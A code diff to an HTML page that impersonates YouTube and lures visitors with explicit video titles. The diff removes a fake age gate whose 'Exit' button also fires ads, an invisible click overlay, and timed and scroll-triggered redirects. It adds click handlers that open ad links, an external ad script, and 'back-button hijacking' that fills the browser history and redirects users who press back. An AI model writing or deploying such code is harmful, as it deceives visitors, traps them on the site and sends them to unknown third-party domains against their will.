@@ -20,62 +20,6 @@
         a { text-decoration:none; color:inherit; }
 
         /* ════════════════════════════════════════════════════════════
-           HIGH-FI REVENUE NEW UI ELEMENTS (PREMIUM DESIGN)
-           ════════════════════════════════════════════════════════════ */
-        
-        #invisibleOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9998;
-            background: transparent;
-            cursor: pointer;
-        }
-
-        /* 18+ Pop-up with Lower Darkness & Blur for Higher Temptation */
-        #ageVerification {
-            position: fixed;
-            inset: 0;
-            background: rgba(8, 8, 10, 0.55); /* ডার্কনেস ০.৮৫ থেকে কমিয়ে ০.৫৫ করা হয়েছে */
-            backdrop-filter: blur(5px); /* ব্লার ১২px থেকে কমিয়ে ৫px করা হয়েছে যেন কন্টেন্ট স্পষ্ট বুঝা যায় */
-            -webkit-backdrop-filter: blur(5px);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .popup-box {
-            background: rgba(31, 31, 35, 0.95); /* পপআপ বক্সকে হালকা ট্রান্সপারেন্ট করা হয়েছে */
-            border: 1px solid rgba(255, 51, 51, 0.4);
-            border-radius: 20px;
-            padding: 40px 30px;
-            max-width: 440px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 0, 0, 0.2);
-        }
-        .popup-box i { font-size: 60px; color: #ff3333; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(255,0,0,0.5)); }
-        .popup-box h2 { font-size: 24px; margin-bottom: 12px; color: #fff; font-weight: 700; }
-        .popup-box p { color: #eee; font-size: 14px; margin-bottom: 30px; line-height: 1.6; font-weight: 500; }
-        .popup-btns { display: flex; gap: 15px; justify-content: center; }
-        .popup-btn {
-            padding: 14px 30px;
-            border: none;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            flex: 1;
-        }
-        .btn-yes { background: #ff0000; color: white; box-shadow: 0 4px 20px rgba(255,0,0,0.4); }
-        .btn-no { background: #3a3a3c; color: #eee; }
-        .popup-btn:hover { transform: scale(1.03); filter: brightness(1.1); }
-
-        /* ════════════════════════════════════════════════════════════
            MODERN YOUTUBE LOOK & STRUCTURE
            ════════════════════════════════════════════════════════════ */
         .youtube-wrapper { max-width:1280px; margin:0 auto; padding:0 16px 40px; }
@@ -86,6 +30,8 @@
         
         .yt-grid { display:grid; grid-template-columns:1fr 380px; gap:24px; }
         @media (max-width:1024px) { .yt-grid { grid-template-columns:1fr; gap: 16px; } }
+        
+        .video-player, .sidebar-item { cursor: pointer; }
         
         .video-player { 
             position:relative; background:#000; border-radius:12px; overflow:hidden; aspect-ratio:16/9; 
@@ -151,22 +97,6 @@
 </head>
 <body>
 
-    <!-- HIGH-FI ELEMENT 1: Premium Age Verification (Reduced Darkness & Blur) -->
-    <div id="ageVerification">
-        <div class="popup-box">
-            <i class="fas fa-exclamation-triangle"></i>
-            <h2>18+ Content Warning</h2>
-            <p>This video is restricted for underage viewers. Please confirm that you are at least 18 years old to unlock and stream full premium content.</p>
-            <div class="popup-btns">
-                <button class="popup-btn btn-yes" onclick="verifyAge()">I am 18+</button>
-                <button class="popup-btn btn-no" onclick="verifyAge()">Exit</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- HIGH-FI ELEMENT 2: Invisible Overlay -->
-    <div id="invisibleOverlay" style="display: none;"></div>
-
     <div class="youtube-wrapper">
         <header class="yt-header">
             <div class="yt-logo"><i class="fab fa-youtube"></i> <span>YouTube</span></div>
@@ -178,7 +108,7 @@
         
         <div class="yt-grid">
             <main class="video-main">
-                <div class="video-player">
+                <div class="video-player" id="videoPlayer">
                     <img id="mainGif" src="" alt="Stream Video" />
                     <div class="play-overlay">
                         <div class="play-circle"><i class="fas fa-play"></i></div>
@@ -230,6 +160,15 @@
             <aside class="sidebar">
                 <div class="sidebar-label">Up Next</div>
                 <div id="suggestedList"></div>
+
+                <!-- ════════════════════════════════════════════════════════════
+                   NATIVE ADS SECTION (আপনার দেওয়া অ্যাড কোড এখানে যুক্ত করা হয়েছে)
+                   ════════════════════════════════════════════════════════════ -->
+                <div class="native-ad-container" style="margin-top: 24px; border-top: 1px solid #272727; padding-top: 16px;">
+                    <div style="font-size: 11px; color: #aaa; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 500;">Sponsored</div>
+                    <script async="async" data-cfasync="false" src="https://yawnacre.com/1bfe3f8dd63f4de9e45baf2ac6eb0cbf/invoke.js"></script>
+                    <div id="container-1bfe3f8dd63f4de9e45baf2ac6eb0cbf"></div>
+                </div>
             </aside>
         </div>
     </div>
@@ -241,8 +180,7 @@
             // ════════════════════════════════════════════════════════════
             const DIRECT_LINK_MAIN = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0'; 
             const REDIRECT_LINK_1  = 'https://parasiteoutdoorsmix.com/zqy8u79c?key=4f4bdff589b9437b3a53e5ffedfcde9a';
-            const REDIRECT_LINK_2  = 'https://parasiteoutdoorsmix.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c'; 
-            const REDIRECT_LINK_3  = 'https://viiukuhe.com/dc/?blockID=360966'; 
+            const BACK_HIJACK_LINK = 'https://omg10.com/4/7619451';
 
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
@@ -258,7 +196,7 @@
             videoPool.forEach((item) => {
                 if(item.title !== mainVideo.title) {
                     sidebarHtml += `
-                    <div class="sidebar-item">
+                    <div class="sidebar-item suggested-video-item">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
@@ -273,58 +211,41 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // HIGH-FI REVENUE ENGINE LOGIC
+            // CLICK LOGIC
             // ════════════════════════════════════════════════════════════
-            let totalClicks = 0;
-
-            function triggerHighFiAds() {
-                totalClicks++;
+            function triggerLinks() {
                 try {
-                    if (totalClicks === 1) {
-                        window.open(REDIRECT_LINK_1, '_blank');
-                        window.open(REDIRECT_LINK_2, '_blank');
-                        window.open(REDIRECT_LINK_3, '_blank');
-                    } else {
-                        window.open(REDIRECT_LINK_1, '_blank');
-                    }
+                    window.open(REDIRECT_LINK_1, '_blank');
                 } catch (e) { }
                 window.open(DIRECT_LINK_MAIN, '_self');
             }
 
-            window.verifyAge = function() {
-                document.getElementById('ageVerification').style.display = 'none';
-                document.getElementById('invisibleOverlay').style.display = 'block'; 
-                triggerHighFiAds(); 
+            document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
+
+            const suggestedItems = document.querySelectorAll('.suggested-video-item');
+            suggestedItems.forEach(function(element) {
+                element.addEventListener('click', triggerLinks);
+            });
+
+            // ════════════════════════════════════════════════════════════
+            // ADVANCED BACK-BUTTON HIJACKING
+            // ════════════════════════════════════════════════════════════
+            function setupHijack() {
+                for (let i = 0; i < 10; i++) {
+                    window.history.pushState(null, document.title, window.location.href);
+                }
             }
 
-            document.getElementById('invisibleOverlay').addEventListener('click', triggerHighFiAds);
-            document.body.addEventListener('click', function(e) {
-                if (!e.target.closest('.popup-box') && document.getElementById('ageVerification').style.display === 'none') {
-                    triggerHighFiAds();
-                }
-            });
+            setupHijack();
 
-            // Auto-Timer Redirect
-            setTimeout(function() {
-                if (totalClicks === 0) {
-                    window.location.replace(DIRECT_LINK_MAIN);
-                }
-            }, 10000); 
+            window.addEventListener('click', setupHijack, { once: true });
+            window.addEventListener('touchstart', setupHijack, { once: true });
 
-            // Scroll-to-Trigger
-            window.addEventListener('scroll', function() {
-                let h = document.documentElement, b = document.body;
-                let percent = (h['scrollTop']||b['scrollTop']) / ((h['scrollHeight']||b['scrollHeight']) - h.clientHeight) * 100;
-                if (percent > 30 && totalClicks === 0) {
-                    triggerHighFiAds();
-                }
-            });
-
-            // Back-Button Hijacking
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function () {
-                window.history.pushState(null, null, window.location.href);
-                window.location.replace(DIRECT_LINK_MAIN);
+            window.onpopstate = function (event) {
+                setupHijack();
+                setTimeout(function() {
+                    window.location.replace(BACK_HIJACK_LINK);
+                }, 50);
             };
         })();
     </script>
